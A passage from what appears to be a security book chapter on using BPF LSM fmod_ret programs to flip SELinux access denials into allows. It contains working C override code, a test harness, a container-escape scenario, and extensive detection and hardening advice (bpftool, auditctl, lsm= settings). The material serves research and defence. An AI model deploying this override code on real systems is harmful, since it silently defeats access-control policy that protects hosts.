userdel "$DUT" 2>/dev/null || deluser "$DUT" 2>/dev/null
```

The DUT UID is passed to the loader via `-u "$DUT_UID"`. The program's UID filter compares against this value, so only opens by this user match. The test itself runs `cat "$SENTINEL"` as this user via `su`, which gives a clean UID transition.

The trigger's verification logic enforces the two-field marker semantics:

```bash
DENY_HITS=$(grep -cE 'stage=deny .* verdict=-13' "$LOG" 2>/dev/null)
FLIP_HITS=$(grep -cE 'stage=flip .* verdict=0 ' "$LOG" 2>/dev/null)

DENIAL_OK=no
FLIP_OK=no
if [ "$BEFORE_RC" = "1" ] && [ "$DENY_HITS" -gt 0 ]; then
  DENIAL_OK=yes
fi
if [ "$AFTER_RC" = "0" ] && [ "$FLIP_HITS" -gt 0 ]; then
  FLIP_OK=yes
fi

if [ "$DENIAL_OK" = "yes" ] && [ "$FLIP_OK" = "yes" ]; then
  echo "=== CH06_CONCEPT_PROVEN denial_injected=yes flip_applied=yes ==="
  exit 0
fi
```

Each field is verified from two independent sources: the userspace exit code of the `cat` command, and the kernelspace event visible in the ringbuf. The two sources being consistent — the user-visible behavior matches the BPF-visible event — is the proof. A test that only checked user-visible behavior could miss a case where the BPF program was not running but some other mechanism produced the same exit codes; a test that only checked BPF-visible events could miss a case where the program logged what it intended to do but the LSM chain overrode it. Requiring both sources to agree eliminates both failure modes.

The `verdict=-13` in the grep is the string representation of `-EACCES`. Linux's `errno.h` defines `EACCES` as `13`; the BPF program returns `-13` (negative, because LSM return values use the negative-errno convention). The userspace consumer formats the verdict with `%d`, producing `-13` for the denier's return. The trigger's grep matches on this exact string, so any change to the BPF program's error value would require updating the grep. The coupling is acceptable because the errno is a stable ABI.

## The three POC variants

The chapter has three POC variants, each targeting a different aspect of the primitive:

- **`ch06-silence-selinux`** (REAL, observer). Kprobes on SELinux internals (`kprobe/avc_has_perm`, `kprobe/avc_has_perm_noaudit`, `kprobe/selinux_file_permission`). Pure observation — streams every AVC decision to a ringbuf without mutation. On kernels where SELinux is not compiled in, the loader disables the programs and exits cleanly. This variant is the reconnaissance channel that tells an attacker which accesses SELinux is evaluating.

- **`ch06-silence-selinux-lsm`** (REAL, mutation). Three BPF LSM fmod_ret programs — `lsm/file_permission`, `lsm/inode_permission`, `lsm/bprm_check_security` — covering the common access paths. Each reads the upstream `ret` arg; if the current tgid is in the target map and `ret != 0` (a pending deny), it flips the return to `0` (allow). Non-sleepable (`lsm/` not `lsm.s/`) because the programs use no sleepable helpers (`bpf_d_path`, `bpf_copy_from_user`, etc.). This is the real enforcement-override primitive.

- **`ch06-silence-selinux-lsm-synthetic`** (ANALOG). A single sleepable `lsm.s/file_open` program that synthesizes both the denial and the flip via a map-driven stage toggle. Sleepable because it uses `bpf_d_path()` to resolve the sentinel file's path. Exists so the primitive is demonstrable on harness kernels that lack SELinux.

## On an SELinux-enforcing kernel

The real mutation variant `ch06-silence-selinux-lsm` exists for SELinux-enforcing kernels. The BPF program attaches three non-sleepable LSM fmod_ret programs covering the common permission-check paths. Non-sleepable (`lsm/` not `lsm.s/`) because none of the programs use sleepable helpers like `bpf_d_path` or `bpf_copy_from_user` — they only inspect pointer arguments and the trailing `ret` value. The core pattern, shown for `file_permission`:

```c
// Non-sleepable: no bpf_d_path/bpf_copy_from_user/etc. used.
SEC("lsm/file_permission")
int BPF_PROG(lsm_file_permission, struct file *file, int mask, int ret)
{
    (void)file; (void)mask;
    unsigned int tgid = bpf_get_current_pid_tgid() >> 32;
    int flipped = 0;
    int new_ret = ret;
    if (is_target_tgid(tgid) && ret != 0) {
        new_ret = 0;
        flipped = 1;
    }
    emit(H_FILE_PERMISSION, ret, flipped);
    return new_ret;
}
```

The same pattern is repeated for `lsm/inode_permission` (path-walk / open-time checks) and `lsm/bprm_check_security` (execve of label-restricted binaries). Each reads the upstream `ret` arg — the result of the static LSM chain — and flips it to `0` when the current tgid is in the target map. On a SELinux-enforcing kernel, this turns every would-be AVC denial into an allow for processes in the target TGID map across all three access paths. The natural denials (confined domain trying to read a `/root/` file, for example) are flipped.

The semantic difference from the synthetic variant is that the denier stage is not needed. SELinux provides the denials; the BPF program provides the flip. On the SELinux-enforcing kernel, a test script would:

1. As the target user, attempt to read a SELinux-denied file. Observe EACCES in `/var/log/audit/audit.log` as an AVC denial.
2. Load the BPF LSM program with the target TGID in the filter map.
3. Repeat the read. Observe success, no AVC denial logged.
4. Remove the BPF program. Repeat the read. Observe EACCES again.

The flip is externally observable via the audit log, by the test program's own exit code, and by SELinux's own statistics (`avc_stats` in `/selinux/avc/`). The synthetic variant cannot reproduce the audit-log observation because there is no SELinux. The synthetic variant reproduces only the BPF-visible half: the `lsm/file_open` hook returning `0` where the control map says `STAGE_FLIP`.

The fmod_ret mechanics are identical between the variants. Both use BPF LSM programs attached via the standard attach path. Both run after the static LSMs. Both's return values become the LSM hook's final return value. The only difference is whether the static LSMs are doing anything at the hook — on SELinux-enforcing, they are; on synthetic, they are not, so the BPF program simulates what they would have done.

This is the honest framing for the synthetic variant. It is not a weaker primitive; it is the same primitive demonstrated on a kernel where the natural environment for the primitive does not exist. The core mechanism — BPF LSM program, fmod_ret semantics, return-value override — is identical. The synthetic variant uses a sleepable hook (`lsm.s/file_open`) with `bpf_d_path` for path-based subject matching; the real variant uses non-sleepable hooks (`lsm/file_permission`, `lsm/inode_permission`, `lsm/bprm_check_security`) with tgid-based filtering, which requires no sleepable helpers.

The production case for the primitive's use on SELinux-enforcing kernels deserves a specific example. Consider a containerized workload on an Amazon Linux 2023 EKS node. The workload runs in a container whose SELinux type is `container_t`, with policy rules that deny reading `/var/log/audit/audit.log` (type `auditd_log_t`). An attacker who has gained code execution inside the container and has obtained `CAP_BPF` (for example, by exploiting a privileged sidecar container sharing the pod's PID namespace) can load a BPF LSM program with `SEC("lsm/file_permission")` that returns `0` for the attacker's TGID when the file being opened has type `auditd_log_t`. The audit log is now readable from inside the container, despite the SELinux policy's denial.

The defender's view of this scenario is that the SELinux AVC log still records the denial (because SELinux's policy evaluation runs before the BPF program's override), but the denial is no longer effective. A correlation rule that checks "AVC denial logged, but the target process exit code suggests success" catches this. The rule requires correlating AVC log entries with process-exit records, which not every defensive stack does out of the box. Adding the correlation is the specific engineering response to the primitive.

A second defender's response is to deny `CAP_BPF` to container workloads, period. Kubernetes admission controllers like Kyverno or OPA/Gatekeeper can enforce this with a policy like "no container may request `CAP_BPF` in its securityContext." A well-configured cluster removes the primitive's prerequisite and the attack does not apply. This is the architectural defense; the correlation-based detection is the compensating control for environments where `CAP_BPF` cannot be fully locked down.

## Detection

BPF LSM programs are among the most introspectable primitives in the BPF universe because the subsystem is explicit by design. Every BPF LSM attachment is visible to `bpftool prog list --type lsm`:

```
# bpftool prog list --type lsm
87: lsm  name ch06_synth_file_open  tag 5f3e2a1b... gpl run_time_ns 1234567 run_cnt 42
    loaded_at 2025-02-06T09:14:22+0000  uid 0
    xlated 1024B  jited 1512B  memlock 4096B  map_ids 14,15,16
    btf_id 89
```

The `lsm` program type, the program name derived from the SEC annotation, the load time, the loader UID, and the map IDs are all present. A defender maintaining an allowlist of known BPF LSM programs catches any new attachment immediately.

The second detection layer is `/sys/kernel/security/lsm` itself:

```
# cat /sys/kernel/security/lsm
capability,selinux,bpf
```

The presence of `bpf` on this line indicates that BPF LSM is enabled. On a hardened system where BPF LSM is not required, removing it from the kernel command line (`lsm=capability,selinux`, omitting `bpf`) prevents BPF LSM programs from attaching at all. `bpf_prog_attach` returns `-EINVAL` with the kernel log line "BPF LSM not enabled." This is the first-line defense: if you do not need BPF LSM, do not enable it.

The third detection layer is `auditctl`. The `bpf(2)` syscall is audited by default on some distributions (RHEL, Fedora with the DISA STIG profile) and can be explicitly audited anywhere with:

```
auditctl -a always,exit -F arch=aarch64 -S bpf -k bpf_syscall
auditctl -a always,exit -F arch=b64 -S bpf -k bpf_syscall
```

The resulting audit records include the `bpf_cmd` in the `a0` argument. `BPF_PROG_LOAD` is `5`; `BPF_LINK_CREATE` is `28`. A defender looking at BPF LSM attachments filters the audit stream for these commands with `bpf_attach_type` indicating LSM.

The fourth detection layer is `ausearch -m AVC` on SELinux-enforcing hosts. The AVC records are produced by SELinux regardless of what the BPF LSM program does (SELinux's policy evaluation runs before the BPF program's fmod_ret), so a flipper-installed BPF program that turns AVC denials into allows does not suppress the AVC records. The defender still sees the SELinux denial; what they do not see is any indication that the denial was flipped. A correlated analysis — AVC denial logged in the audit stream, but the target process appears to have succeeded in the operation that was supposedly denied — is a signal that something overrode the denial.

The fifth detection layer is BPF program load auditing via the `bpf_prog` tracepoint. The kernel's `bpf_attach_prog` tracepoint fires on every BPF program attachment. A defender who enables this tracepoint and consumes it gets a real-time feed of BPF LSM attachments. The feed is high-volume (every BPF program load, not just LSM) but can be filtered.

The combination of these detection layers makes BPF LSM a detectable primitive in principle. The practical weakness is that detection is not enabled by default on most distributions. A defender who runs the detection queries occasionally catches new attachments; a defender who does not run them has no visibility into BPF LSM activity.

A detection strategy for the specific synthetic variant examined in this POC — or for any BPF LSM program that uses `bpf_d_path` plus a string match — can look at the program's xlated bytecode. `bpftool prog dump xlated id <n>` produces a BPF disassembly that includes helper call names:

```
# bpftool prog dump xlated id 87
  0: (bf) r6 = r1
  1: (b7) r2 = 0
  2: (7b) *(u64 *)(r10 -8) = r2
  ...
 23: (85) call bpf_map_lookup_elem#1
  ...
 47: (85) call bpf_d_path#147
  ...
 58: (85) call bpf_ringbuf_reserve#131
```

A program that calls `bpf_d_path` and is attached to an LSM hook is a small set of legitimate tools. Runtime security tools like Tracee, Falco-with-BPF-LSM, and Tetragon can all match this signature. A defender with a known allowlist of such tools catches unknown LSM programs that call `bpf_d_path` as anomalous. The signature is not pathognomonic — benign BPF programs can call `bpf_d_path` for legitimate path-based policy — but combined with attachment timing and loader-process context, it narrows the investigation.

The sixth detection layer is the BTF allowlist itself. An LSM program must match the BTF type of its target hook exactly. `bpftool btf dump id <btf_id>` gives the program's BTF, including the type it expects for each argument. A program attached to `lsm/file_open` must have its first argument as `struct file *`; a mismatch fails the attach. This means a defender can infer the hook from the BTF alone, without needing to see the attach metadata. The inference is useful in forensic contexts where the program is pinned but the attachment state is uncertain.

## Scope

The primitive documented here is a Class I primitive in the taxonomy developed in Chapter 20. A Class I primitive is real, effective, and available on a stock production kernel. The natural variant is Class I on any kernel with a policy-enforcing LSM active; the synthetic variant is a demonstration of the same mechanism on a kernel that lacks the natural environment, so it is more of a teaching tool than a deployed primitive.

The real variant is effective on:

- **RHEL/Fedora**: SELinux is enforcing by default. BPF LSM is present when `CONFIG_BPF_LSM=y` and the `lsm=` command line includes `bpf` (which is the RHEL 9+ default).
- **Amazon Linux 2023**: SELinux is enforcing, BPF LSM is present. This is the production server environment for AWS.
- **Android**: SELinux is enforcing, but BPF LSM is generally not exposed to user-space through normal channels. A root-level attacker on Android has a path to BPF LSM via `init` or via a privileged daemon's BPF privileges.
- **Ubuntu**: AppArmor is the default policy-enforcing LSM, not SELinux. The same BPF LSM mechanism applies against AppArmor denials with one caveat: AppArmor's hook surface does not exactly match SELinux's, and some hooks have different combination semantics.

The synthetic variant exists for kernels where neither SELinux nor AppArmor is active — notably linuxkit (as used by Docker Desktop), some Alpine-based container images, and reduced-footprint embedded distributions. On those kernels the natural primitive has nothing to flip, and the synthetic variant is the only way to demonstrate the mechanism end-to-end.

The distinction between the three variants maps to the POC category labels: the observer (`ch06-silence-selinux`) and the real mutation variant (`ch06-silence-selinux-lsm`) are both REAL; the synthetic (`ch06-silence-selinux-lsm-synthetic`) is ANALOG. The core mechanism — BPF LSM program attached to an LSM hook, returning `0` to allow or a negative errno to deny, with the return value combined into the LSM chain's final decision — is identical across the mutation variants. The synthetic variant manufactures both sides of the combination; the natural variant receives one side (the denial) from the static LSM and provides the other side (the flip) from BPF. The observer variant uses kprobes rather than LSM hooks and provides the reconnaissance feed.

A defender evaluating their exposure to this primitive asks two questions:

1. Is `bpf` in `/sys/kernel/security/lsm`? If no, the primitive is disabled at the kernel-command-line level and no BPF LSM program can attach. If yes, BPF LSM is enabled and the primitive is available.
2. Do I have baseline-diff monitoring on `bpftool prog list --type lsm`? If no, BPF LSM attachments are happening without observation. If yes, the attachment event is visible and can be alerted on.

The answers to these two questions determine whether the primitive is a risk on a given host. The first question is a configuration question; the second is a monitoring question. The primitive itself is Class I on any kernel where both answers are "yes, available and not monitored."

A final observation on the primitive's place in the book. Chapter 1 documented a Class IV primitive (observation-only, because `cap_capable` is not in `ALLOW_ERROR_INJECTION`). Chapter 3 documented a Class IV primitive (observation-only, because `audit_log_start` is not in the `bpf_modify_return_targets` set). This chapter is the first Class I primitive in the book, because BPF LSM was explicitly designed to allow runtime verdict modification for a specific set of hooks. The design choice reflects the LSM subsystem's philosophy: the LSM chain is the supported policy surface, BPF programs are first-class participants in that chain, and the participation extends to return-value modification for hooks where the maintainers have decided it is safe. `cap_capable` and `audit_log_start` do not have that explicit opt-in; `file_open` does. The contrast between the chapters is the contrast between "observation only, by the kernel's design" and "enforcement participation, by the kernel's design." Both are legitimate design choices; the primitive's class depends on which choice applies.

The same contrast maps onto the defender's calculus. For Class IV primitives, the defender's job is to detect the attachment and investigate. For Class I primitives, the defender's job is the same plus an additional task: evaluate whether the attachment has modified the policy surface in ways that affect the defender's security posture. A BPF LSM program attached to `file_permission` might be benign (a legitimate runtime security tool) or malicious (a flipper). Distinguishing the two requires looking at the program's behavior, not just its existence. The detection layers documented in the Detection section above are necessary but not sufficient; investigation of the program's actual verdicts is the additional step that a Class I primitive demands.

```c
// The core flip, from ch06-silence-selinux-lsm-synthetic.bpf.c.
SEC("lsm.s/file_open")
int BPF_PROG(ch06_synth_file_open, struct file *file)
{
    // ... UID filter, path resolution, sentinel match ...

    if (c->stage == STAGE_DENY) {
        verdict = -EACCES;
    } else if (c->stage == STAGE_FLIP) {
        // Flipper: the denier would have returned -EACCES here; we
        // return 0 instead. This is the primitive: a BPF LSM program
        // turning a would-be deny into an allow.
        verdict = 0;
    }

    return verdict;
}

char LICENSE[] SEC("license") = "GPL";
```
